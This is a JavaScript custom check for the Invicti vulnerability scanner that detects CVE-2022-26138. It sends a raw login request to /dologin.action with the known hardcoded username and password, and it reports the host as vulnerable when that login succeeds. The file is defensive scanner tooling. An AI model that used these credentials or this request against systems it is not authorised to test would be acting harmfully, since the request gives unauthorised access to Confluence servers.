/* 
*  This Singular Security Check script was generated by Invicti Standard
*  For more information about Custom Script Checks and samples, please refer to documentation: 
*  https://www.invicti.com/support/custom-security-checks-scripting/ 
*/ 

function analyze(response) {
    logUI("CVE-2022-26138 custom script started!");
	var re = /(https?:\/\/)([^:^\/]*)(:?\d*)(.*)?/;
	var capture = response.Uri.match(re);
	var host = capture[2].toString() + capture[3].toString();
	var url = capture[1].toString() + host
	var body = "os_username=disabledsystemuser&os_password=disabled1system1user6708&login=Log+in&os_destination=%2Finvicti.action";
    var length = body.length;
    
	var raw =  `POST /dologin.action HTTP/1.1
Host: ${host}
Content-Type: application/x-www-form-urlencoded
Content-Length: ${length}

${body}`;
	
	var response = invicti.requestRaw(url, raw, false);
	
	if (response.statusCode == 302 && response.headers["Location"].includes("invicti.action")) {
		logUI("CVE-2022-26138 custom script ended!");
		return new Vulnerability("0bc1b972-0dc1-41aa-8d20-8bc87ae3ef2a");
	}   
	logUI("CVE-2022-26138 custom script ended!");
}
